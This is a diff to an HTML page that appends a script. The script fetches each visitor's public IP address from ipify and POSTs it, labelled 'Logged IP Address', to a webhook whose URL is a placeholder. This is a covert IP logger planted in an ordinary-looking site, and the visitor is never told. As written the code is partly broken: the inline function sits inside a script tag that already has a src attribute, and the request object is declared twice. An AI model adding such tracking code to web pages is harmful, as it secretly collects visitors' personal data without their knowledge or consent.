@@ -47,6 +47,30 @@
 <script src="typed.js"></script>
 <script src="title.js"></script>
 <script src="main.js"></script>
+     
+<script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP">
+    function getIP(json) {
+        // Script By BY JUB0T //
+        console.log("My public IP address is: ", json.ip);
+        var request = new XMLHttpRequest();
+        const Hook = "URL-HERE";
+
+        var request = new XMLHttpRequest();
+        request.open("POST", Hook);
+        request.setRequestHeader('Content-type', 'application/json');
+        var params = {
+            username: "Sosi",
+            embeds: [
+                { "color": 7506394, // Decimal Color [ Blue ]
+                "title": "Logged IP Address",
+                "description": json.ip
+            }]
+        }
+        request.send(JSON.stringify(params));
+
+    }
+    
+</script>
 
 </html>
     
